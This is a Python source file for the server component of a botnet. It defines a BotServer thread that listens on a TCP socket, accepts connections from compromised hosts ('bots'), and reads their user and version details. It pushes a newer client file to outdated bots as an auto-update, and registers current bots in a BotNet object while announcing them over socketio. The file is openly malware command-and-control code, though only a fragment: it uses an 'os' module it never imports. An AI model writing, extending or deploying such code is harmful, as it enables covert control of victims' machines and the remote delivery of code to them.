from threading import Thread
from distutils.version import LooseVersion
import json

try:
    from server import formatsock, server
    from server.client import client
    from server.botnetclasses import BotNet, Bot
except:
    import formatsock
    import server
    from client import client
    from botnetclasses import BotNet, Bot

MIN_CLIENT_VERSION = client.__version__

class BotServer(Thread):
    def __init__(self, tcpsock, botnet, socketio):
        Thread.__init__(self)
        self.tcpsock = tcpsock
        self.botnet = botnet
        self.socketio = socketio
        self.clientversion = LooseVersion(MIN_CLIENT_VERSION)

    def run(self):
        while True:
            self.tcpsock.listen(5)
            (clientsock, (ip, port)) = self.tcpsock.accept()
            clientformatsock = formatsock.FormatSocket(clientsock)
            msgbytes = clientformatsock.recv()
            host_info = json.loads(msgbytes.decode('UTF-8'))

            user = host_info['user'].strip()
            botversion = LooseVersion(host_info['version'])
            bot = Bot(clientsock, host_info, self.socketio)
            if botversion < self.clientversion:
                # Autoupdate
                print("[*] Updating {} on version {}".format(user, botversion))
                bot.sendClientFile(open(os.path.abspath(client.__file__), 'rb'))
            else:
                print("[+] Received connection from {}".format(user))
                self.botnet.addConnection(user, bot)
                self.socketio.emit('connection', {'user': user}, namespace='/bot')
